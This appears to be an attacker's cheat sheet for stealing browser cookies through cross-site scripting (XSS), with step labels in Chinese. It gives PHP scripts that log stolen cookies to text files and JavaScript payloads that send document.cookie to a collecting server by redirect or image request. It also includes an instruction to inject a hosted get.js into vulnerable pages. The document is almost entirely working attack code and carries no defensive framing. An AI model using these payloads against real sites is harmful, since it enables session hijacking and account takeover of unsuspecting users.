<?php
 $file=fopen("1.txt","a");

 if($_GET['cookie']){
    $cookie=$_GET['cookie'];
    fputs($file,"$cookie\r\n");
 }
?>
<script>document.location='http://127.0.0.1/getcookie.php?cookie='+document.cookie;</script>
<script>alert(document.location='http://127.0.0.1/getcookie.php?cookie='+document.cookie)</script>


1) 构建hacker.php
<?php
  $cookie = $_GET['cookie'];
  var_dump($cookie);
  $myFile = "cookie.txt";
  file_put_contents($myFile, $cookie);
?>

2) 构建hacker.js
var img = new Image();
img.src = "http://127.0.0.1/xss-js/hacker.php?cookie=" + document.cookie;
document.body.append(img);

3) 构建get.js然后放到Web服务器上,比如http://www.myweb.com/get.js
   在存在xss漏洞的地方插入你的js,比如 <script src="http://127.0.0.1/get.js"></script>
var img = document.createElement('img');
img.width = 0;
img.height = 0;
img.src = 'http://www.myweb.com/get.jsp?msg='+encodeURIComponent(document.cookie);


